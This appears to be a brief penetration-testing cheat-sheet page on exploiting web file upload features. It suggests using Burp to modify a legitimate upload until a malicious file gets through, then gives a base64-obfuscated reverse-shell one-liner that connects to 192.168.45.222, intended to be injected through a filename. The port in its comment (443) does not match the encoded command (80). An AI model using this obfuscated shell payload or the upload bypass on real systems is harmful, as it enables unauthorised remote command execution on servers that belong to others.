---
title: File Upload
tags:
  - Exploitation
  - Web
---

[!ref icon="rocket" text="File Upload"](https://book.hacktricks.xyz/pentesting-web/file-upload)


### Burp

1. Use burp to upload a legitimate file.
2. Modify it until out get our malicious file uploaded !

### Reverse Shell

```bash If you need to get a R.S via filename, use base64 to avoid error

# eq. "/bin/bash -i >& /dev/tcp/192.168.45.222/443 0>&1"
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjIyLzgwIDA+JjEK | base64 -d | bash 
```